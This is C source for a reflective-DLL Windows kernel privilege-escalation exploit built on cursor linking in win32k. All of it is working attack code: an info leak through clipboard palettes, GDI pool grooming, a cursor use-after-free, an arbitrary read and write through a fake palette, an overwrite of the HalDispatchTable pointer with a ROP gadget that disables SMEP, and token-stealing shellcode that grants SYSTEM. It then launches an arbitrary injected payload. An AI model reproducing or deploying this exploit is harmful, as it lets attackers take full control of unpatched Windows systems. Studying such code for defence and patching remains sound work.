#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// Uncomment this line to enable to debug output
//#define DEBUGGING

// Purloined from ntstatus.h
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#define WIN32_NO_STATUS
#include <windows.h>
#include "LinkCursorPoc.h"
#undef WIN32_NO_STATUS

#ifdef DEBUGGING
// only needed because of the output printf stuff when debugging
#include <stdio.h>
#endif

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

// payload info
typedef struct {
    LPVOID lpPayload;
    DWORD offset;
} *PINFO;

#ifdef DEBUGGING
void dprintf(char* pszFormat, ...)
{
    char s_acBuf[2048];
    va_list args;
    va_start(args, pszFormat);
    vsprintf_s(s_acBuf, sizeof(s_acBuf) - 1, pszFormat, args);
    OutputDebugString(s_acBuf);
    va_end(args);
}
#else
#define dprintf(...)
#endif

// syscall numbers

#define __NR_NtUserLinkDpiCursor    0x138e
#define __NR_NtUserDestroyCursor    0x109d
#define __NR_NtUserInjectGesture    0x1385
#define __NR_NtUserConvertMemHandle    0x10fe
#define __NR_NtCreateTimer            0x0b1
#define __NR_NtQueryIntervalProfile    0x132


/* Globals */

BYTE SyscallCode[] = "\x4C\x8B\xD1"          // MOV R10, RCX
                     "\xB8\x00\x00\x00\x00"  // MOV EAX,
                     "\x0F\x05"              // SYSENTER
                     "\xC3";                 // RET

BYTE AdjustStack[] = "\x48\x83\xEC\x40"                          // sub rsp, 40h
                     "\x49\xBA\xDE\xC0\xAD\xDE\xDE\xC0\xAD\xDE"  // mov r10, 0DEADC0DEh address of gestureInfo+38h
                     "\x4C\x89\x54\x24\x20"                      // mov [rsp+20h], r10        
                     "\x48\xB8\xDE\xC0\xAD\xDE\xDE\xC0\xAD\xDE"     // mov qword ptr rax, deadc0deh
                     "\xFF\xD0"                                  // call rax
                     "\x48\x83\xC4\x40"                          // add rsp, 40h
                     "\xC3";                                     // ret

// This slightly modified shellcode is taken from Sebastian Apelt's Pwn2Own Afd.sys 
// privilege escalation write up, credit to him

BYTE sc[] = "\x41\x51"                                  // push r9 save regs
            "\x41\x52"                                  // push r10
            "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      // mov r9, gs:[0x188], get _ETHREAD from KPCR (PRCB @ 0x180 from KPCR, _ETHREAD @ 0x8 from PRCB)
            "\x4D\x8B\x89\xB8\x00\x00\x00"              // mov r9, [r9+0xb8], get _EPROCESS from _ETHREAD
            "\x4D\x89\xCA"                              // mov r10, r9 save current eprocess
            "\x4D\x8B\x89\x40\x02\x00\x00"              // mov r9, [r9+0x240] $a, get blink
            "\x49\x81\xE9\x38\x02\x00\x00"              // sub r9, 0x238 => _KPROCESS
            "\x49\x83\xB9\xE0\x02\x00\x00\x04"          // cmp [r9+0x2e0], 4 is UniqueProcessId == 4?
            "\x75\xe8"                                  // jnz $a no? then keep searching!
            "\x4D\x8B\x89\x48\x03\x00\x00"              // mov r9, [r9+0x348] get token
            "\x4D\x89\x8A\x48\x03\x00\x00"              // mov [r10+0x348], r9 replace our token with system token
            "\x49\xB9\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"  // mov r9, 0Ah  dynamic object address of freed palette
            "\x49\xBA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"  // mov r10, 0Ah dynamic object handle of freed palette
            "\x4D\x89\x11"                              // mov [r9], r10 replace the wrong handle with the original object handle
            "\x41\x83\x61\x08\x00"                      // and dword ptr [r9+8], 0 zero out the objects reference count
            "\x41\x5A"                                  // pop r10 restore regs
            "\x41\x59"                                  // pop r9
            "\x48\x8B\x44\x24\x20"                      // mov rax, [rsp+0x20] repair stack
            "\x48\x83\xC0\x3F"                          // add rax, 0x3f
            "\x48\x83\xEC\x30"                          // sub rsp, 0x30
            "\x48\x89\x04\x24"                          // mov [rsp], rax
            "\xc3";                                     // ret resume

PBYTE SyscallCodePtr = SyscallCode;
PBYTE GestureCodePtr = AdjustStack;

DWORD OldProtect;

PLOGPALETTE logPal420;
HPALETTE    palArray[32];
HPALETTE    fillerPalettes[32];

// Needed for window creation
LRESULT CALLBACK GestureProc(HWND wnd, UINT msg, WPARAM wpar, LPARAM lpar) {
    LRESULT res;

    switch (msg) {
    default:
        res = DefWindowProc(wnd, msg, wpar, lpar);
        break;
    }

    return res;
}

// Used for system calls ( http://j00ru.vexillium.org/ )
ULONG CallService(DWORD ServiceId, __int64 Argument1, __int64 Argument2, __int64 Argument3,
    __int64 Argument4, __int64 Argument5, __int64 Argument6, __int64 Argument7,
    __int64 Argument8) {
    ULONG retval = 0;

    memcpy(&SyscallCode[4], &ServiceId, sizeof(DWORD));

    retval = SystemCall(Argument1, Argument2, Argument3, Argument4,
        Argument5, Argument6, Argument7, Argument8);

    return retval;
}

/* 
    Because GDI allocations don't get immediately freed, we need to allocate at least 32 objects
    of the same size in order to trigger a call to nt!ExDeferredFreePool which allows us to 
    replace the desired object
*/
void FlushDeferredPool(void) {
    ULONG i;

    for (i = 0; i < 32; i++) {
        fillerPalettes[i] = CreatePalette(logPal420);
    }

    for (i = 0; i < 32; i++) {
        DeleteObject(fillerPalettes[i]);
    }
}


// Wrapper around CallService which adjusts the stack and is used to replace the freed Cursor
ULONG InjectGesture(HWND hwnd, PEXTGESTUREINFO gestureInfo) {
    QWORD addr = (QWORD)SystemCall;
    ULONG i = 0;
    DWORD ServiceId = __NR_NtUserInjectGesture;
    QWORD extra = (QWORD)(gestureInfo + 1);

    memcpy(&AdjustStack[6], &extra, sizeof(QWORD));
    memcpy(&AdjustStack[21], &addr, sizeof(QWORD));
    memcpy(&SyscallCode[4], &ServiceId, sizeof(DWORD));

    VirtualProtect(AdjustStack, sizeof(AdjustStack), PAGE_EXECUTE_READWRITE, &OldProtect);

    memcpy(&NtInjectGesture, &GestureCodePtr, sizeof(PVOID));

    for (i = 0; i < 5; i++) {

        NtInjectGesture(SYSCALL_ARG(hwnd),
                        0,
                        0,
                        SYSCALL_ARG(gestureInfo),
                        0,0,0,0);
    }
    return 0;
}

QWORD info_leak(void) {

    HDC         hDC = NULL;
    LOGPALETTE  logpal;
    HPALETTE    hPal;
    HBITMAP     hclipbm;
    HBITMAP     hbm;
    VOID **     ppvBits;
    BOOL        opened = FALSE;

    QWORD       palEntriesPtr   = 0;
    QWORD       currentPalette  = 0;
    QWORD       lastPalette     = 0;
    QWORD       targetPalette   = 0;

    QWORD *     leakingDib = NULL;
    HANDLE      hHeap;
    ULONG       i = 0;
    ULONG       pal_allocs        = 0;
    ULONG       contiguous_allocs = 0;
    ULONG       deterministic     = 3;
    ULONG       try_count         = 0;
    ULONG       max_tries         = 200;

    HPALETTE    htemp = NULL;

    hHeap = GetProcessHeap();

    ppvBits = HeapAlloc(hHeap,
                        HEAP_ZERO_MEMORY,
                        0x10);

    logPal420 = HeapAlloc(hHeap,
                          HEAP_ZERO_MEMORY,
                          0x8900);

    //logPal420->palNumEntries = 0xe5;
    logPal420->palVersion = 0x0300;
    logPal420->palNumEntries = 0x2300;

    logpal.palNumEntries = 1;
    logpal.palVersion = 0x0300;

    htemp = CreatePalette(logPal420);
    DeleteObject(htemp);

    // A basic palette object is 0x98 + 4 * numEntries bytes in size, so in order to fit into
    // the leaking dib which is 0x42c bytes big, we need 0xe5 entries ( 0x98 + 4 * 0xe5 = 0x42c)
    logPal420->palNumEntries = 0xe5;

    do {

        hPal = CreatePalette(&logpal);

        hclipbm = CreateCompatibleBitmap(hDC, 1, 1);

        // Create the "special" bitmap
        hbm = CreateBitmap(1,            // width
                           1,            // height
                           1,            // planes
                           5,            // bitsPerPel
                           ppvBits);

        opened = OpenClipboard(NULL);

        if (opened != FALSE) {
        }
        else {
            return 0;
        }

        EmptyClipboard();

        SetClipboardData(CF_BITMAP, (HANDLE)hclipbm);

        // Place the dummy DIB on the clipboard by closing it
        CloseClipboard();

        opened = FALSE;
        opened = OpenClipboard(NULL);

        if (opened != FALSE) {
        }
        else {
            return 0;
        }

        SetClipboardData(CF_BITMAP, hbm);

        SetClipboardData(CF_DIBV5, NULL);

        SetClipboardData(CF_PALETTE, hPal);

        FlushDeferredPool();

        // Convert the bitmap to DIB and leak the uninitialized data
        leakingDib = (QWORD *)GetClipboardData(CF_DIB);

        FlushDeferredPool();

        // One of these palettes will later be freed
        for (i = 0; i < 32; i++) {
            palArray[i] = CreatePalette(logPal420);
        }

        palEntriesPtr = *(leakingDib + 16);     // palEntries pointer @0x80
        currentPalette = *(leakingDib + 17);    // this pointer @0x88

        palEntriesPtr -= 0x90;

        /*
            We can make sure that we have leaked a palette object by substracting 0x90 from
            the palEntries pointer which then has to be equal to the this pointer
        */
        if (palEntriesPtr == currentPalette) {

            pal_allocs++;

            if (lastPalette != 0) {

                if (lastPalette == currentPalette) {

                    contiguous_allocs++;

                    /* 
                        If the same palette gets leaked 4 times in a row, the state is deterministic
                        and we can be certain that at the leaked address there will be a palette
                        object allocated
                    */
                    if (contiguous_allocs == deterministic) {

                        targetPalette = currentPalette;
                        break;
                    }
                }
                else {

                    lastPalette = currentPalette;
                    contiguous_allocs = 0;
                }

                /*
                    After 100 tries, check additionally if two or more palettes were allocated
                    this is manly to speed up the leaking process (even though the speed is not a
                    problem), because the allocations are not always that deterministic. This version
                    is a bit less "secure" but it still works reliably.
                */
                if (try_count >= 100 && pal_allocs >= 2) {
                    targetPalette = currentPalette;
                    break;
                }
            }
            else {

                lastPalette = currentPalette;
                contiguous_allocs = 0;
            }
        }
        else {

            lastPalette = 0;
            contiguous_allocs = 0;
            pal_allocs = 0;
        }

        for (i = 0; i < 32; i++) {
            DeleteObject(palArray[i]);
        }

        CloseClipboard();
        try_count++;

    } while (try_count < max_tries);

    if (targetPalette != 0) {
        dprintf("[*] Tries needed: %d\n", try_count);
    }

    return targetPalette;
}


DWORD WINAPI execute_payload(LPVOID lpPayload)
{
    VOID(*lpCode)() = (VOID(*)())lpPayload;
    lpCode();
    return ERROR_SUCCESS;
}


void link_and_destroy(LPVOID info) {

    HDC        hDC           = NULL;
    HANDLE     hHeap         = NULL;
    HWND       hWnd          = NULL;
    HPALETTE   freedPalette  = NULL;
    HINSTANCE  hExe          = NULL;
    HCURSOR    hCursorA      = NULL;
    HCURSOR    hCursorB      = NULL;
    HANDLE     timer         = NULL;
    ULONG      hMem          = 0;

    WNDCLASSEX wcx;

    QWORD ntArbAddReserved = 0;
    QWORD rop_gadget = 0;

    DWORD new_cr4 = 0x000406f8;

    ULONG   i = 0;
    UINT    c = 0;
    UINT    found = 0;
    BOOL    linked = FALSE;

    HMODULE  KernelHandle               = 0;
    QWORD    HalDispatchTable           = 0;
    QWORD    HaliQuerySystemInformation = 0;
    QWORD    kernelBase                 = 0;
    QWORD    DTableQueryInterval        = 0;

    QWORD targetPalette = 0;

    PBYTE            shellcode     = NULL;
    PFAKEPALETTE     fakepalette   = NULL;
    PEXTGESTUREINFO  gestureInfo   = NULL;
    LPPALETTEENTRY   palentries    = NULL;

    PINFO pInfo = NULL;

    PALETTEENTRY palentry;

    xxxNtQuerySystemInformation xxNtQuerySystemInformation = NULL;

    RTL_PROCESS_MODULES ModuleInfo;

    BYTE AndMask[] = {
        0xFF, 0xFF, 0xFF, 0xFF
    };

    BYTE XORMask[] = {
        0xFF, 0xFF, 0xFF, 0xFF
    };

    // info contains the payload address and the offset
    pInfo = (PINFO)info;

    dprintf("[*] payload resides @ %llx \n", pInfo->lpPayload);
    dprintf("[*] using offset: %lx \n", pInfo->offset);

    hHeap = GetProcessHeap();

    palentries = (PALETTEENTRY *)HeapAlloc(hHeap,
                                           HEAP_ZERO_MEMORY,
                                           0x20);

    fakepalette = (FAKEPALETTE *)HeapAlloc(hHeap,
                                           HEAP_ZERO_MEMORY,
                                           0x42c);

    // Set the flags that we can delete the freed palette later on (cleanup)
    fakepalette->flags = 0x501;
    // By setting numEntries to 0xe6 we can later distinguish between the normal palettes 
    // and our fakepalette
    fakepalette->numEntries = 0xe6;

    shellcode = (BYTE *)VirtualAlloc((LPVOID)0x00000000dead0000,  // max one DWORD long
                                     0x100,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);

    xxNtQuerySystemInformation = (xxxNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    xxNtQuerySystemInformation(SystemModuleInformation,
                               &ModuleInfo,
                               sizeof(ModuleInfo),
                               NULL);

    // Get HalDispatchTable
    KernelHandle        = LoadLibraryA(ModuleInfo.Modules[0].FullPathName + ModuleInfo.Modules[0].OffsetToFileName);
    kernelBase            = (QWORD)ModuleInfo.Modules[0].ImageBase;
    HalDispatchTable    = (QWORD)GetProcAddress(KernelHandle, "HalDispatchTable");
    HalDispatchTable    = HalDispatchTable - (QWORD)KernelHandle + (QWORD)ModuleInfo.Modules[0].ImageBase;
    DTableQueryInterval = HalDispatchTable + 8;

    dprintf("[*] HalDispatchTable+8 @%llx \n", DTableQueryInterval);

    // Create Cursors
    hCursorA = CreateCursor(NULL,
                            1,
                            1,
                            4,
                            4,
                            AndMask,
                            XORMask);

    hCursorB = CreateCursor(NULL,
                            1,
                            1,
                            4,
                            4,
                            AndMask,
                            XORMask);

    dprintf("[*] Leaking address... \n");

    targetPalette = info_leak();

    if (!targetPalette) {
        dprintf("[!] Exploit failed: couldn't leak palette, try it again \n");
        return;
    }

    dprintf("[*] Palette was created @%llx \n", targetPalette);

    VirtualProtect(SyscallCode, sizeof(SyscallCode), PAGE_EXECUTE_READWRITE, &OldProtect);

    memcpy(&SystemCall, &SyscallCodePtr, sizeof(PVOID));

    dprintf("[*] Linking cursors... \n");

    // Link the cursors
    linked = CallService(__NR_NtUserLinkDpiCursor,
                         SYSCALL_ARG(hCursorA),
                         SYSCALL_ARG(hCursorB),
                         SYSCALL_ARG(0x30),
                         0,0,0,0,0);


    if (linked != FALSE) {
        dprintf("[*] Success \n");
    }
    else {
        dprintf("[!] Exploit failed: couldn't link cursors \n");
        return;
    }

    hExe = GetModuleHandle(NULL);

    // Register the main window class. 
    wcx.cbSize          = sizeof(wcx);
    wcx.style           = CS_HREDRAW | CS_VREDRAW;
    wcx.lpfnWndProc     = (WNDPROC)GestureProc;
    wcx.cbClsExtra      = 0;
    wcx.cbWndExtra      = 0;
    wcx.hInstance       = hExe;
    wcx.hIcon           = NULL;
    wcx.hCursor         = NULL;
    wcx.hbrBackground   = NULL;
    wcx.lpszMenuName    = "MainMenu";
    wcx.lpszClassName   = "MainWClass";
    wcx.hIconSm         = NULL;

    if (!RegisterClassEx(&wcx)) {
        dprintf("[!] Exploit failed: couldn't register window class \n");
        return;
    }

    hWnd = CreateWindow("MainWClass",        // name of window class 
                        "Sample",            // title-bar string 
                        WS_OVERLAPPEDWINDOW, // top-level window 
                        CW_USEDEFAULT,       // default horizontal position 
                        CW_USEDEFAULT,       // default vertical position 
                        CW_USEDEFAULT,       // default width 
                        CW_USEDEFAULT,       // default height 
                        (HWND)NULL,          // no owner window 
                        (HMENU)NULL,         // use class menu 
                        hExe,                 // handle to application instance 
                        (LPVOID)NULL);       // no window-creation data 

    gestureInfo = (EXTGESTUREINFO*)HeapAlloc(hHeap,
                                             HEAP_ZERO_MEMORY,
                                             0x90);

    gestureInfo->cbSize         = sizeof(GESTUREINFO);
    gestureInfo->cbExtraArgs    = 0x40;
    gestureInfo->hwndTarget     = hWnd;
    gestureInfo->dwFlags        = 1;
    gestureInfo->dwID           = 0;
    gestureInfo->ptsLocation.x  = 0x0001;
    gestureInfo->ptsLocation.y  = 0x0002;
    gestureInfo->dwInstanceID   = 0xdeadbeef;
    gestureInfo->arbitraryFree  = targetPalette;
    gestureInfo->ulArguments    = 1;

    fakepalette->SelfRefPtrLow       = (DWORD)targetPalette;
    fakepalette->SelfRefPtrHigh      = (DWORD)(targetPalette >> 32);
    // This is were we will write and read
    fakepalette->PalEntriesPtrLow    = (DWORD)DTableQueryInterval;
    fakepalette->PalEntriesPtrHigh   = (DWORD)(DTableQueryInterval >> 32);

    // No logs between this part, its time critical apparently
    dprintf("[*] Freeing palette... \n");

    // Destroy and free Cursor B
    CallService(__NR_NtUserDestroyCursor,
                SYSCALL_ARG(hCursorB),
                SYSCALL_ARG(0x0),
                0,0,0,0,0,0);

    // Replace the freed Cursor with our gestureInfo
    InjectGesture(hWnd, gestureInfo);

    // Destroy Cursor A and free the target palette
    CallService(__NR_NtUserDestroyCursor,
                SYSCALL_ARG(hCursorA),
                SYSCALL_ARG(0x0),
                0,0,0,0,0,0);

    FlushDeferredPool();

    // Replace the freed palette with our fakepalette
    for (i = 0; i < 32; i++) {

        hMem = CallService(__NR_NtUserConvertMemHandle,
                           SYSCALL_ARG(fakepalette),
                           SYSCALL_ARG(0x418),
                           0,0,0,0,0,0);
    }

    dprintf("[*] Replacing palette with fakepalette \n");

    // Search in the previously allocated palettes for one that has it's numberEntries member
    // set to 0xe6 (like in our fakepalette)
    for (i = 0; i < 32; i++) {

        found = GetPaletteEntries(palArray[i],
                                  0xe5,
                                  1,
                                  &palentry);

        // If we find one we have successfully replaced our target palette
        if (found) {

            dprintf("[*] Freed palette was successfully replaced \n");
            // HPALETTE
            freedPalette = palArray[i];
            break;
        }
    }

    if (freedPalette != NULL) {

        // Leak the function address of nt!ArbAddReserved @ HalDispatchTable+18h to bypass ASLR
        GetPaletteEntries(freedPalette,
                          4,
                          2,
                          palentries);

        ntArbAddReserved = *((QWORD *)palentries);

        dprintf("[*] nt!ArbAddReserved@%llx \n", ntArbAddReserved);

        GetPaletteEntries(freedPalette,
                          0,
                          2,
                          palentries);

        HaliQuerySystemInformation = *((QWORD *)palentries);

        // Calculate the address of nt!KiConfigureDynamicProcessor+0x40 which will serve as our
        // rop gadget to disable SMEP
        // this offset varies between versions
        rop_gadget = ntArbAddReserved - pInfo->offset;

        /*
            mov cr4, rax
            add rsp, 28h
            ret
        */
        

        dprintf("[*] rop gadget@%llx \n", rop_gadget);
        palentries = (LPPALETTEENTRY)&rop_gadget;

        // Overwrite the NtQueryIntervalProfile pointer @ HalDispatchTable+8 with our rop gadget
        SetPaletteEntries(freedPalette,
                          0,
                          2,
                          palentries);

        // Write the palette object address and it's handle to the shellcode
        memcpy(&sc[63], &targetPalette, sizeof(QWORD));
        memcpy(&sc[73], &freedPalette, sizeof(QWORD));

        memcpy(shellcode, sc, sizeof(sc));

        // Clean the stack with zeros
        CallService(__NR_NtCreateTimer,
                    SYSCALL_ARG(&timer),
                    SYSCALL_ARG(0x1f0003),
                    SYSCALL_ARG(0x0),
                    SYSCALL_ARG(0x0),
                    0,0,0,0);

        dprintf("[*] executing shellcode! \n");

        // Disable SMEP and execute shellcode !
        CallService(__NR_NtQueryIntervalProfile,
                    SYSCALL_ARG(shellcode),
                    SYSCALL_ARG(&new_cr4),
                    0,0,0,0,0,0);

        palentries = (LPPALETTEENTRY)&HaliQuerySystemInformation;

        // Restore the NtQueryIntervalProfile pointer
        SetPaletteEntries(freedPalette,
                          0,
                          2,
                          palentries);

        // Delete the freed palette
        DeleteObject(freedPalette);

        // Delete the remaining palette handles
        for (i = 0; i < 32; i++) {
            DeleteObject(palArray[i]);
        }

        // If everything worked process should be privileged at this point
        dprintf("[!] Executing payload... \n");
        CreateThread(0, 0, execute_payload, pInfo->lpPayload, 0, NULL);
    }
    else {

        dprintf("[!] Exploit failed: Could not find freed palette. \n");
    }

    return;
    
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
    switch (dwReason)
    {
    case DLL_QUERY_HMODULE:
        hAppInstance = hinstDLL;
        if (lpReserved != NULL)
        {
            *(HMODULE *)lpReserved = hAppInstance;
        }
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        link_and_destroy(lpReserved);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}